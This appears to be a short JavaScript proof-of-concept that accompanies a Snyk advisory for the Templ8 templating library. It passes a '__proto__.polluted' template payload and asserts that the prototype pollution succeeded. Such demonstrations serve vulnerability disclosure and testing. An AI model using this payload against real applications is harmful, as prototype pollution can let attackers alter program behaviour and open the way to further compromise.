//https://snyk.io/vuln/SNYK-JS-TEMPL8-598770

const Templ8 = require('Templ8'); 
var tpl = new Templ8( '{{__proto__.polluted="yes"}}' ); 
const { assert } = require("@firebase/util");
var obj = {}
console.log("Before : " + obj.polluted);
tpl.parse(); 

console.log("After : " +polluted);
assert(polluted === "yes");
console.log("payload success!");